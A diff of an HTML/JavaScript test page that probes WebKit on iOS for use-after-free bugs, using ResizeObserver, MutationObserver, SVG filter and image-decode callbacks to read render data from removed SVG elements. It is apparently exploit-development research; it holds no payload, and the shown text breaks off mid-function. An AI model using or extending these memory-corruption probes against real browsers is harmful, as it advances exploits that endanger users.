@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG CSS render UAF v14 · render object lifetime + layout mid-remove</title>
+<title>SVG async destroy UAF v15 · ResizeObserver + MutationObserver + filter + image</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -18,19 +18,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG CSS render UAF v14 · CSS anim render obj + layout mid-remove + event target ref · iOS 26.5.2</h2>
+<h2>SVG async destroy UAF v15 · ResizeObserver + MutationObserver + SVG filter + img decode · iOS 26.5.2</h2>
 <div class="sub">
-  v13 FINDING: SMIL animate.targetElement → ALWAYS returns useEl (JSC bridge sanitizes)
-  CSS animation event ref survives remove() — different lifetime than SMIL
-  v14: CSS animation render object UAF + layout-triggered stale ptr + getComputedStyle after remove
-  Goal: find a path that dereferences freed RenderObject* (not sanitized by JSC)
+  v14 FINDING: WebKit destroys RenderObjects SYNCHRONOUSLY with remove() — no window in CSS path
+  v15: hunt ASYNC destruction paths — callbacks that fire AFTER remove() but hold stale ptrs
+  ResizeObserver / MutationObserver / SVG filter cache / image decode callback
+  Goal: find a callback that holds a live C++ ptr to a freed element
 </div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runCS()">CS css-render</button>
-  <button onclick="runLY()">LY layout-remove</button>
-  <button onclick="runGC()">GC computed-style</button>
-  <button onclick="runFO()">FO foreignObject</button>
+  <button onclick="runRO()">RO resize-observer</button>
+  <button onclick="runMO()">MO mutation-observer</button>
+  <button onclick="runFI()">FI svg-filter</button>
+  <button onclick="runIM()">IM image-decode</button>
+  <button onclick="runIO()">IO intersection-observer</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -38,75 +39,78 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * v13 PIVOT RATIONALE:
- *   SMIL animate.targetElement: ALWAYS returns useEl (JSC bridge sanitizes stale ptr)
- *   The C++ SVGAnimateElement ptr reuse is real but JSC always identifies the live obj
- *   We cannot bypass JSC bridge sanitization via targetElement getter
+ * v14 FINDING: RenderObject destroyed synchronously with remove()
+ *   CSS anim, layout, getComputedStyle — all return clean values after remove()
+ *   WebKit is very aggressive about synchronous render cleanup
  *
- *   WR T1 FINDING: CSS event ref survives remove()
- *   capturedTarget.tagName=symbol AFTER sym1.remove()
- *   This is a JS strong ref (expected) BUT exposes a different attack surface:
- *   CSS animation → C++ CSSAnimationUpdate → RenderObject* — NOT through JSC bridge
+ * v15 HYPOTHESIS: some WebKit objects ARE destroyed asynchronously
+ *   ResizeObserver callbacks: fire in a microtask AFTER layout (not sync with remove)
+ *   MutationObserver callbacks: fire in a microtask, record may predate remove()
+ *   SVG filter effects: FilterEffect cache may survive element remove
+ *   Image decode: network/decode callbacks are async, fire after element freed
+ *   IntersectionObserver: fires asynchronously when visibility changes
  *
- * v14 APPROACHES:
+ * WHAT WE'RE LOOKING FOR:
+ *   A callback that fires AFTER remove() where:
+ *     (a) the element ref in the callback is still live (JS ref keeps it alive)
+ *     (b) BUT the C++ RenderObject or FilterEffect or image decoder was freed
+ *     (c) reading render data through that JS ref dereferences freed C++ memory
  *
- * CS (css-render):
- *   Drive a CSS keyframe animation on sym1 (opacity, transform, etc.)
- *   In rAF callback: remove sym1 while animation frame is in-flight
- *   Check: does getComputedStyle on capturedTarget crash? Return stale data?
- *   C++ path: CSSAnimationController → StyleResolver → RenderObject*
- *   After remove(): RenderObject is destroyed, but CSSAnimationController
- *   might still hold a ptr to it (no JSC bridge sanitization here)
+ * CRASH = confirmed async UAF exists
+ * STALE VALUES = freed memory read (gold)
+ * UNEXPECTED BEHAVIOR = may indicate corrupted state
  *
- *   ALSO: animationiteration event — fires on EVERY loop
- *   capture the event, remove the element INSIDE the event handler
- *   then READ computed style inside same handler — C++ is still mid-dispatch
+ * TESTS:
  *
- * LY (layout-remove):
- *   Trigger a FORCED LAYOUT while sym1 is being removed
- *   SVGSymbolElement participates in layout via its RenderSVGHiddenContainer
- *   If we call getBBox() or offsetWidth on a SIBLING element while sym1.remove()
- *   is mid-layout → layout may hold stale RenderObject ptrs
- *
+ * RO (ResizeObserver):
+ *   ResizeObserver on sym1 fires in a microtask after layout
  *   Pattern:
- *     sym1 with CSS animation running (forces continuous layout)
- *     in rAF: call sym1.remove() → IMMEDIATELY call sibling.getBBox()
- *     the sibling's getBBox forces synchronous layout
- *     layout traversal may access sym1's freed RenderObject
+ *     1. RO observes sym1 → sym1 is laid out → RO callback queued
+ *     2. sym1.remove() → RenderObject destroyed
+ *     3. RO microtask fires → entry.target = sym1 (JS ref alive)
+ *     4. Inside callback: getBBox(sym1), getComputedStyle(sym1) — freed render obj?
+ *   Key: the RO entry was created BEFORE remove() — ptr was valid at queueing time
+ *   After remove() destroys the render obj, callback fires with stale entry data
+ *   entry.contentRect may carry stale geometry from the freed render obj
  *
- * GC (computed-style):
- *   getComputedStyle on element AFTER remove() — does the style engine crash?
- *   CSS animations update computed style on a timer
- *   if the timer fires AFTER remove() but BEFORE the element is GC'd:
- *     style engine accesses element's render data
- *     element has no RenderObject (was destroyed on remove())
- *     → null deref or stale ptr in style engine
- *
+ * MO (MutationObserver):
+ *   MutationObserver on sym1's parent — fires in microtask after childList change
  *   Pattern:
- *     CSS anim on sym1 (fast: 0.01s)
- *     remove sym1
- *     IMMEDIATELY call getComputedStyle(sym1) in tight loop
- *     look for crash or stale values
+ *     1. MO observes livesvg for childList
+ *     2. sym1.remove() queues a MO callback
+ *     3. INSIDE the callback: sym1 ref available via addedNodes/removedNodes
+ *     4. sym1 was removed — its render obj freed — read sym1's render state
+ *   Key: MO callback fires SYNCHRONOUSLY (in microtask immediately after remove)
+ *   But MO callbacks can also be batched — read in the batch
+ *   Also: modify sym1 from INSIDE the MO callback → triggers secondary MO
+ *   secondary MO fires LATER — after more cleanup has happened
  *
- * FO (foreignObject):
- *   Put sym1 inside <foreignObject> inside the SVG
- *   foreignObject creates a mixed SVG/HTML layout boundary
- *   SVGSymbolElement inside foreignObject is unusual (spec-undefined behavior)
- *   animating sym1 inside foreignObject may expose a different C++ ptr path
- *   remove sym1 while foreignObject is being rendered
- *   also: use CSS animation on the foreignObject itself while sym1 is inside
+ * FI (SVG filter):
+ *   SVG filters (feBlend, feDisplacementMap, feTurbulence) cache FilterEffect objects
+ *   FilterEffectRenderer holds ptrs to filter primitives
+ *   Pattern:
+ *     1. sym1 with SVG filter applied (filter="url(#myFilter)")
+ *     2. Remove sym1 → FilterEffectRenderer may cache result
+ *     3. REUSE the same filter on another element → filter cache lookup
+ *     4. Cache hit uses ptrs from freed sym1's filter state → UAF
+ *   Also: dynamically modify filter primitive AFTER sym1 is removed
+ *   If filter cache holds a ptr to sym1's render obj and we modify the filter:
+ *   → filter update callback may deref freed ptr
  *
- * CRASH DETECTION:
- *   window.onerror catches JS-level crashes
- *   But C++ heap corruption may crash without a catchable JS error
- *   We log each step — if the log stops mid-test: crash at that step
- *   We also use a heartbeat (setTimeout 0 after each risky call) — if it doesn't fire: crash
+ * IM (image decode):
+ *   <image> inside sym1 with data: URI or a URL that takes time to load
+ *   SVGImageElement decode fires asynchronously
+ *   Pattern:
+ *     1. Create sym1 with <image src="..."> — decode queued
+ *     2. IMMEDIATELY remove sym1 before decode completes
+ *     3. Decode callback fires → tries to update sym1's render obj → freed
+ *   Also: use img.decode() Promise — resolve fires after element freed
  *
- * STALE DATA DETECTION:
- *   Before remove: record baseline values (opacity, transform matrix, computed style)
- *   After remove: call getComputedStyle on capturedRef
- *   If values are non-zero/non-default: stale render data being read
- *   If values are different from baseline in unexpected ways: UAF read
+ * IO (IntersectionObserver):
+ *   IO fires asynchronously when element enters/leaves viewport
+ *   Pattern:
+ *     1. IO observes sym1 (in viewport → fires immediately on next frame)
+ *     2. Read sym1's render data from inside IO callback after remove()
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -116,22 +120,14 @@ function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.te
 const sep=()=>log('─'.repeat(52),'sep');
 const raf=()=>new Promise(r=>requestAnimationFrame(r));
 const tick=()=>new Promise(r=>setTimeout(r,0));
+const micro=()=>new Promise(r=>queueMicrotask(r));
 function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){const a=document.createElement('textarea');a.value=Lel.innerText;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
 function clearLog(){Lel.innerHTML='';}
 function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.toString().match(/copy|clear/i))b.disabled=d;});}
-window.onerror=(m,_,l,c,err)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
+window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
 window.onunhandledrejection=e=>{log(`[UNHANDLED] ${e.reason}`,'bad');};
 
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
-
-let styleEl=null;
-function injectStyle(css){
-    if(styleEl)styleEl.remove();
-    styleEl=document.createElement('style');
-    styleEl.textContent=css;
-    document.head.appendChild(styleEl);
-}
-function clearStyle(){if(styleEl){styleEl.remove();styleEl=null;}}
 
 function mkSym(id,w,h){
     const sym=document.createElementNS(SVG_NS,'symbol');
@@ -139,436 +135,557 @@ function mkSym(id,w,h){
     const r=document.createElementNS(SVG_NS,'rect');
     r.setAttribute('x','10');r.setAttribute('y','10');
     r.setAttribute('width',String(w||80));r.setAttribute('height',String(h||80));
+    r.setAttribute('fill','blue');
     sym.appendChild(r);
     return sym;
 }
 
-// ── CS: CSS animation render object UAF ──────────────────────────────────
-// CSS animations drive style updates through C++ (not through JSC bridge)
-// animationiteration event fires WHILE the animation C++ state is live
-// remove element INSIDE event handler → C++ style engine still mid-dispatch
-// read computed style after remove → does it crash or return stale data?
-async function runCS(q=false){
-    if(!q){dis(true);sep();log('▶ CS: CSS animation render UAF — remove inside event handler','inf');sep();}
-    log('[*] CSS keyframe on sym1 → remove() inside animationiteration handler','inf');
-    log('[*] read getComputedStyle inside same handler (C++ still mid-dispatch)','ok');
-    log('[*] baseline vs post-remove computed values — looking for stale data or crash','ok');
+// ── RO: ResizeObserver callback fires after remove() ──────────────────────
+async function runRO(q=false){
+    if(!q){dis(true);sep();log('▶ RO: ResizeObserver — callback fires in microtask after remove()','inf');sep();}
+    log('[*] RO observes sym1 → sym1 layout fires → remove sym1 → RO callback','inf');
+    log('[*] key: entry.contentRect may carry stale geometry from freed RenderObj','ok');
+    log('[*] also reading getBBox/getComputedStyle inside RO callback','ok');
     log('');
 
-    let staleCount=0,defaultCount=0,crashCount=0,eventsFired=0;
-    const staleValues=[];
+    let cbFired=0,staleGeom=0,crashInCb=0,normalCb=0;
+    const staleDetails=[];
 
     for(let t=0;t<20;t++){
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        clearStyle();
         await raf();await raf();
 
-        const sym1=mkSym(`cs_${t}`,80,80);
-        sym1.setAttribute('class',`cs_anim_${t}`);
-        // Put sym1 visibly in livesvg so CSS animation fires
+        const sym1=mkSym(`ro_${t}`,80,80);
+        // Make sym1 a real rendered element (not just a symbol — RO needs a box)
+        // Use a regular SVG rect element that RO can observe
+        const observed=document.createElementNS(SVG_NS,'rect');
+        observed.setAttribute('id',`ro_rect_${t}`);
+        observed.setAttribute('x','10');observed.setAttribute('y','10');
+        observed.setAttribute('width','80');observed.setAttribute('height','80');
+        observed.setAttribute('fill','red');
         livesvg.appendChild(sym1);
+        livesvg.appendChild(observed);
 
-        // CSS animation: fast loop, animating opacity
-        // opacity is a cheap property — style engine reads from render obj
-        injectStyle(`
-            @keyframes cs_pulse_${t} {
-                0%   { opacity: 1.0; }
-                25%  { opacity: 0.5; }
-                50%  { opacity: 0.1; }
-                75%  { opacity: 0.5; }
-                100% { opacity: 1.0; }
-            }
-            .cs_anim_${t} {
-                animation: cs_pulse_${t} 0.05s linear infinite;
-            }
-        `);
+        // Also add a useEl for sym1 so it actually renders
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#ro_${t}`);
+        livesvg.appendChild(useEl);
 
-        // Get baseline computed style BEFORE anything
-        let baseOpacity='?',baseDisplay='?';
-        try{
-            const cs=getComputedStyle(sym1);
-            baseOpacity=cs.opacity;
-            baseDisplay=cs.display;
-        }catch(e){}
+        await raf(); // let layout happen so RO has geometry to observe
 
-        // Capture element ref for use in event handler
-        const capturedSym=sym1;
-        let handled=false;
-        let postOpacity='?',postDisplay='?',postTagName='?',postId='?';
-        let handlerCrashed=false;
+        // Baseline geometry
+        let baseBB=null;
+        try{baseBB=sym1.getBBox();}catch(e){}
+        let baseUseBB=null;
+        try{baseUseBB=useEl.getBBox();}catch(e){}
 
         await new Promise(resolve=>{
-            let timeoutId=setTimeout(()=>{
-                // No animation event fired — element might not be animating
-                log(`  t${t}: no animationiteration fired within timeout`,'dim');
-                resolve();
-            },500);
+            let resolved=false;
+            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
+            setTimeout(safeResolve,800); // fallback
 
-            sym1.addEventListener('animationiteration',function handler(e){
-                if(handled){return;}
-                handled=true;
-                clearTimeout(timeoutId);
-                eventsFired++;
+            const ro=new ResizeObserver((entries)=>{
+                cbFired++;
+                const entry=entries[0];
+                if(!entry){safeResolve();return;}
 
-                // ① Record the target ref from the event
-                const evTarget=e.target;
+                // contentRect from RO — this is geometry cached at observation time
+                const cr=entry.contentRect;
+                const crW=cr?cr.width:null;
+                const crH=cr?cr.height:null;
 
-                // ② REMOVE the element while we're inside the event handler
-                //    C++ is still in the middle of dispatching this event
-                //    StyleEngine/AnimationController holds ptrs to sym1's render obj
-                try{capturedSym.remove();}catch(ex){log(`  t${t}: remove() threw: ${ex}`,'bad');}
+                // NOW remove sym1 while we're inside the RO callback
+                try{sym1.remove();}catch(ex){}
+                try{useEl.remove();}catch(ex){}
 
-                // ③ Immediately read computed style — C++ may deref freed render obj
-                try{
-                    const cs=getComputedStyle(capturedSym);
-                    postOpacity=cs.opacity;
-                    postDisplay=cs.display;
-                }catch(ex){handlerCrashed=true;crashCount++;postOpacity='[crash]';}
+                // Read render data from freed element — directly after remove inside cb
+                let postBBW=null,postBBCrash=null;
+                try{const bb=sym1.getBBox();postBBW=bb.width;}
+                catch(ex){postBBCrash=String(ex.message).slice(0,40);crashInCb++;}
 
-                // ④ Read from the event target directly
-                try{postTagName=evTarget.tagName;}catch(ex){postTagName='[crash]';crashCount++;}
-                try{postId=evTarget.id;}catch(ex){postId='[crash]';crashCount++;}
+                let postCSO=null,postCSCrash=null;
+                try{postCSO=getComputedStyle(sym1).opacity;}
+                catch(ex){postCSCrash=String(ex.message).slice(0,40);crashInCb++;}
 
-                // ⑤ Try getBBox on the removed element
-                let postBBox='?';
-                try{postBBox=JSON.stringify(capturedSym.getBBox());}catch(ex){postBBox='[crash:'+ex.message+']';}
+                let postUseW=null;
+                try{const bb=useEl.getBBox();postUseW=bb.width;}catch(ex){}
 
-                // Check for stale data
-                const opacityF=parseFloat(postOpacity);
-                const isStale=!isNaN(opacityF)&&opacityF>0&&opacityF<1.0&&postOpacity!==baseOpacity;
-                const isMidAnim=!isNaN(opacityF)&&opacityF!==0&&opacityF!==1;
+                // entry.target should still be sym1 (JS ref)
+                let tgtTag='?',tgtBBW=null;
+                try{tgtTag=entry.target.tagName;}catch(ex){}
+                try{const bb=entry.target.getBBox();tgtBBW=bb.width;}catch(ex){}
 
-                if(isMidAnim||isStale){
-                    staleCount++;
-                    staleValues.push({t,base:baseOpacity,post:postOpacity,tag:postTagName});
-                    log(`  t${t}: [STALE?] base_opacity=${baseOpacity} post_opacity=${postOpacity}`,'bad');
-                    log(`          tag=${postTagName} id=${postId} bbox=${postBBox}`,'bad');
+                const interesting=(postBBW&&postBBW!==0)||(postCSCrash)||(tgtBBW&&tgtBBW!==0&&tgtBBW!==baseBB?.width);
+                if(interesting){
+                    staleGeom++;
+                    staleDetails.push({t,crW,crH,postBBW,postUseW,tgtBBW});
+                    log(`  t${t}: [STALE/CRASH] crW=${crW} postBB=${postBBW??postBBCrash} useW=${postUseW} tgtBBW=${tgtBBW}`,'bad');
                 }else{
-                    defaultCount++;
-                    if(t<3)log(`  t${t}: base=${baseOpacity} post=${postOpacity} tag=${postTagName} bbox=${postBBox}`,'dim');
+                    normalCb++;
+                    if(t<3)log(`  t${t}: crW=${crW} postBB=${postBBW} postCS=${postCSO} tgt=${tgtTag} tgtBBW=${tgtBBW}`,'dim');
                 }
 
-                resolve();
-            },{once:false}); // not once — fire on EVERY iteration, resolve on first
+                ro.disconnect();
+                safeResolve();
+            });
+
+            // Observe the rect (RO works on HTML elements too, but SVG rects are observable in modern WebKit)
+            try{ro.observe(observed);}
+            catch(ex){
+                log(`  t${t}: RO.observe failed: ${ex.message}`,'dim');
+                safeResolve();
+            }
         });
 
-        clearStyle();
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();
     }
 
-    log(`\n[*] CS: eventsFired=${eventsFired} stale=${staleCount} default=${defaultCount} crash=${crashCount}`,(staleCount>0?'bad':'inf'));
-    if(staleCount>0){
-        log(`[+] STALE DATA READ — computed style returned mid-animation values after remove()!`,'bad');
-        for(const v of staleValues)log(`    t${v.t}: ${v.base} → ${v.post} tag=${v.tag}`,'bad');
-    }else if(crashCount>0){
-        log(`[+] CRASH during CSS animation event handler — C++ UAF likely!`,'bad');
-    }else{
-        log(`[*] no stale data — style engine clears render obj ptr on remove() synchronously`,'inf');
-    }
+    log(`\n[*] RO: cbFired=${cbFired} stale=${staleGeom} normal=${normalCb} crash=${crashInCb}`,(staleGeom>0||crashInCb>0?'bad':'inf'));
+    if(staleGeom>0)log(`[+] ResizeObserver callback exposes stale render data after remove()!`,'bad');
+    if(crashInCb>0)log(`[+] CRASH inside RO callback — freed RenderObject accessed!`,'bad');
 
     if(!q)dis(false);
-    return{eventsFired,staleCount,defaultCount,crashCount};
+    return{cbFired,staleGeom,crashInCb};
 }
 
-// ── LY: layout-triggered stale RenderObject ptr ──────────────────────────
-// SVGSymbolElement has a RenderSVGHiddenContainer
-// getBBox() on ANY element in the same SVG triggers synchronous layout
-// if we remove sym1 AND immediately call getBBox on a sibling:
-//   layout runs, may access sym1's freed RenderObject if layout list wasn't cleared
-// also: try calling getBBox on sym1 ITSELF after remove() (direct freed obj access)
-async function runLY(q=false){
-    if(!q){dis(true);sep();log('▶ LY: layout mid-remove — getBBox on sibling during sym1.remove()','inf');sep();}
-    log('[*] sym1.remove() → IMMEDIATELY getBBox(sibling) in same sync block','inf');
-    log('[*] also: getBBox(sym1) after remove — direct freed RenderObject access','ok');
-    log('[*] CSS anim on sibling to keep layout dirty → makes stale ptr more likely','ok');
+// ── MO: MutationObserver — read removed node's render state in callback ───
+async function runMO(q=false){
+    if(!q){dis(true);sep();log('▶ MO: MutationObserver — read sym1 render state inside remove callback','inf');sep();}
+    log('[*] MO fires in microtask after sym1.remove() — sym1 ref in removedNodes','inf');
+    log('[*] inside callback: getBBox, getComputedStyle, SMIL targetElement on sym1','ok');
+    log('[*] also: re-insert sym1 from inside callback → does render obj resurrect?','ok');
     log('');
 
-    let crashCount=0,staleCount=0,normalCount=0;
-    const bboxValues=[];
+    let cbFired=0,staleCount=0,crashCount=0,normalCount=0;
+    let reinsertBBoxes=[];
 
-    injectStyle(`
-        @keyframes ly_spin {
-            0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}
-        }
-        .ly_spin { animation: ly_spin 0.1s linear infinite; }
-    `);
-
-    for(let t=0;t<24;t++){
+    for(let t=0;t<20;t++){
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();await raf();
 
-        const sym1=mkSym(`ly_${t}_s1`,80,80);
-        const sym2=mkSym(`ly_${t}_s2`,40,40); // sibling
-
-        // useEl for sym1 — keeps it in layout
+        const sym1=mkSym(`mo_${t}`,80,80);
+        const sym2=mkSym(`mo_${t}_s2`,40,40);
         const useEl=document.createElementNS(SVG_NS,'use');
-        useEl.setAttribute('href',`#ly_${t}_s1`);
-        useEl.setAttribute('class','ly_spin'); // CSS anim keeps layout dirty
+        useEl.setAttribute('href',`#mo_${t}`);
+        // Animate href so SMIL animate is caching a ptr
+        const anim=document.createElementNS(SVG_NS,'animate');
+        anim.setAttribute('attributeName','href');
+        anim.setAttribute('values',`#mo_${t};#mo_${t}_s2`);
+        anim.setAttribute('dur','0.1s');
+        anim.setAttribute('repeatCount','indefinite');
+        useEl.appendChild(anim);
 
-        livesvg.appendChild(sym1);
-        livesvg.appendChild(sym2);
-        livesvg.appendChild(useEl);
+        livesvg.appendChild(sym1);livesvg.appendChild(sym2);livesvg.appendChild(useEl);
+        await raf();await raf(); // let SMIL animation cache ptr
 
-        await raf();await raf(); // let layout settle + animation start
-
-        // BASELINE
         let baseW=0;
         try{baseW=useEl.getBBox().width;}catch(e){}
 
-        // ── PHASE 1: sym1.remove() then IMMEDIATELY getBBox(useEl) same sync block
-        let p1W=null,p1Crash=null;
-        sym1.remove();
-        try{p1W=useEl.getBBox().width;}catch(ex){p1Crash=String(ex);crashCount++;}
+        await new Promise(resolve=>{
+            let resolved=false;
+            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
+            setTimeout(safeResolve,600);
 
-        // ── PHASE 2: getBBox on sym1 itself after remove
-        let p2W=null,p2H=null,p2Crash=null;
-        try{const bb=sym1.getBBox();p2W=bb.width;p2H=bb.height;}catch(ex){p2Crash=String(ex);crashCount++;}
+            const mo=new MutationObserver((mutations)=>{
+                cbFired++;
+                const mut=mutations[0];
+                if(!mut){mo.disconnect();safeResolve();return;}
 
-        // ── PHASE 3: getComputedStyle on sym1 after remove
-        let p3Op=null,p3Crash=null;
-        try{p3Op=getComputedStyle(sym1).opacity;}catch(ex){p3Crash=String(ex);crashCount++;}
+                // Get the removed node from the mutation record
+                const removed=mut.removedNodes[0]; // this is sym1
+                if(!removed){mo.disconnect();safeResolve();return;}
 
-        // ── PHASE 4: force layout again after free, check sibling's bbox
-        let p4W=null,p4Crash=null;
-        try{p4W=sym2.getBBox().width;}catch(ex){p4Crash=String(ex);crashCount++;}
+                // Read render state of the removed node
+                let moBBW=null,moBBCrash=null;
+                try{const bb=removed.getBBox();moBBW=bb.width;}
+                catch(ex){moBBCrash=ex.message.slice(0,40);crashCount++;}
 
-        // Analyze
-        const interesting=(p1W!==null&&p1W!==baseW&&p1W!==0)
-                        ||(p2W!==null&&p2W!==0)
-                        ||(p2Crash&&p2Crash.includes('crash'))
-                        ||(p1Crash!==null);
+                let moCSO=null;
+                try{moCSO=getComputedStyle(removed).opacity;}catch(ex){}
 
-        if(interesting){
-            staleCount++;
-            log(`  t${t}: [INTERESTING!] base=${baseW} p1=${p1W??p1Crash} p2=${p2W??p2Crash} p3=${p3Op??p3Crash} p4=${p4W??p4Crash}`,'bad');
-        }else{
-            normalCount++;
-            if(t<4)log(`  t${t}: base=${baseW} p1=${p1W} p2=${p2W} p3=${p3Op} p4=${p4W}`,'dim');
-        }
+                // Read SMIL animate.targetElement inside MO callback
+                let moTgt=null,moTgtTag='?';
+                try{moTgt=anim.targetElement;if(moTgt)moTgtTag=moTgt.tagName;}catch(ex){}
 
-        bboxValues.push({t,baseW,p1W,p2W,p2Crash,p1Crash});
+                // Re-insert sym1 from inside callback
+                let reinsertBB=null;
+                try{
+                    livesvg.appendChild(removed); // re-insert
+                    const bb=removed.getBBox();
+                    reinsertBB=bb.width;
+                    reinsertBBoxes.push(reinsertBB);
+                    removed.remove(); // clean up
+                }catch(ex){}
+
+                const interesting=(moBBW&&moBBW!==0)||(moBBCrash)||(moTgtTag==='symbol'&&moTgt?.id?.includes(`mo_${t}`));
+                if(interesting){
+                    staleCount++;
+                    log(`  t${t}: [STALE] moBBW=${moBBW??moBBCrash} moCS=${moCSO} tgt=${moTgtTag} reinsertBB=${reinsertBB}`,'bad');
+                }else{
+                    normalCount++;
+                    if(t<3)log(`  t${t}: moBBW=${moBBW} moCS=${moCSO} tgtTag=${moTgtTag} reinsert=${reinsertBB}`,'dim');
+                }
+
+                mo.disconnect();
+                safeResolve();
+            });
+
+            mo.observe(livesvg,{childList:true,subtree:true});
+            sym1.remove(); // triggers MO
+        });
 
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();
     }
 
-    clearStyle();
-    log(`\n[*] LY: stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
-    if(p2Values_nonzero(bboxValues)){
-        log(`[+] getBBox(sym1_after_remove) returned non-zero: freed RenderObject accessed!`,'bad');
-    }
+    log(`\n[*] MO: cbFired=${cbFired} stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
+    if(reinsertBBoxes.length>0)log(`[*] reinsert BBs: ${reinsertBBoxes.slice(0,6).join(' ')}`,'dim');
 
     if(!q)dis(false);
-    return{staleCount,normalCount,crashCount};
-}
-function p2Values_nonzero(arr){return arr.some(v=>v.p2W!==null&&v.p2W!==0);}
-
-// ── GC: getComputedStyle tight loop after remove ─────────────────────────
-// Fire getComputedStyle on sym1 in a tight loop after remove()
-// CSS animation timer may fire mid-loop → style engine accesses freed render obj
-// looking for: stale values, unexpected values, or crash
-async function runGC(q=false){
-    if(!q){dis(true);sep();log('▶ GC: getComputedStyle tight loop after remove()','inf');sep();}
-    log('[*] CSS anim on sym1 → sym1.remove() → tight getComputedStyle loop','inf');
-    log('[*] looking for: stale opacity values, crash, or unexpected computed values','ok');
-    log('');
-
-    let hitCount=0,missCount=0,crashCount=0;
-    const hitValues=[];
-
-    for(let t=0;t<16;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        clearStyle();
-        await raf();await raf();
-
-        const sym1=mkSym(`gc_${t}`,80,80);
-        livesvg.appendChild(sym1);
-
-        injectStyle(`
-            @keyframes gc_fade_${t} {
-                0%{opacity:1}50%{opacity:0.01}100%{opacity:1}
-            }
-            #gc_${t} { animation: gc_fade_${t} 0.02s linear infinite; }
-        `);
-
-        await raf(); // let animation start
-
-        // Baseline
-        let baseOp='?';
-        try{baseOp=getComputedStyle(sym1).opacity;}catch(e){}
-
-        // Remove sym1
-        sym1.remove();
-
-        // Tight loop: getComputedStyle immediately and repeatedly
-        const LOOP=200;
-        const opValues=[];
-        for(let i=0;i<LOOP;i++){
-            try{
-                const cs=getComputedStyle(sym1);
-                const op=cs.opacity;
-                opValues.push(op);
-            }catch(ex){
-                crashCount++;
-                opValues.push('[crash:'+ex.message+']');
-                break;
-            }
-        }
-
-        // Analyze: any value between 0 and 1 exclusive (mid-animation)?
-        const unique=[...new Set(opValues)];
-        const midAnim=unique.some(v=>{const f=parseFloat(v);return!isNaN(f)&&f>0&&f<1;});
-        const allZero=unique.every(v=>v==='0'||v==='0.01'||v==='');
-        const hasCrash=unique.some(v=>v.includes('crash'));
-
-        if(midAnim&&!allZero){
-            hitCount++;
-            hitValues.push({t,base:baseOp,unique:unique.slice(0,5)});
-            log(`  t${t}: [STALE ANIM VALUES] base=${baseOp} unique=${unique.slice(0,4).join('|')}`,'bad');
-        }else if(hasCrash){
-            crashCount++;
-            log(`  t${t}: CRASH in getComputedStyle loop`,'bad');
-        }else{
-            missCount++;
-            if(t<3)log(`  t${t}: base=${baseOp} unique=${unique.slice(0,3).join('|')}`,'dim');
-        }
-
-        clearStyle();
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();
-    }
-
-    log(`\n[*] GC: hit=${hitCount} miss=${missCount} crash=${crashCount}`,(hitCount>0||crashCount>0?'bad':'inf'));
-    if(hitCount>0){
-        log(`[+] getComputedStyle returned mid-animation values after remove() — style UAF!`,'bad');
-        for(const h of hitValues)log(`    t${h.t}: ${h.base}→${h.unique.join('|')}`,'bad');
-    }
-
-    if(!q)dis(false);
-    return{hitCount,missCount,crashCount};
+    return{cbFired,staleCount,crashCount};
 }
 
-// ── FO: foreignObject boundary UAF ───────────────────────────────────────
-// Put sym1 inside <foreignObject> inside SVG
-// foreignObject creates HTML/SVG layout boundary — unusual for symbols
-// CSS animation on foreignObject while sym1 is inside
-// Also: <use> referencing sym1 from outside foreignObject (cross-boundary use)
-// remove sym1 while foreignObject animation is running
-// Check: does cross-boundary use crash? does getBBox on foreignObject return stale data?
-async function runFO(q=false){
-    if(!q){dis(true);sep();log('▶ FO: foreignObject boundary — sym1 inside fo, use outside','inf');sep();}
-    log('[*] sym1 inside foreignObject → use references sym1 from outside fo','inf');
-    log('[*] CSS anim on foreignObject → remove sym1 mid-animation','ok');
-    log('[*] also: getBBox(foreignObject) after sym1 remove → stale layout data?','ok');
+// ── FI: SVG filter cache UAF ──────────────────────────────────────────────
+// SVGFilterElement creates FilterEffect objects that may be cached
+// WebKit caches filter results for performance (FilterEffectRenderer)
+// If we reuse the same filter on a new element after the original host is removed:
+// the cache lookup may access ptrs from the freed element's filter state
+async function runFI(q=false){
+    if(!q){dis(true);sep();log('▶ FI: SVG filter cache — reuse filter after source element removed','inf');sep();}
+    log('[*] filter on sym1 → remove sym1 → apply same filter to new element','inf');
+    log('[*] also: modify filter primitive after sym1 removed — cache update UAF?','ok');
+    log('[*] also: animate filter primitive via SMIL while source is removed','ok');
     log('');
 
-    let staleCount=0,crashCount=0,normalCount=0;
+    let crashCount=0,staleCount=0,normalCount=0;
 
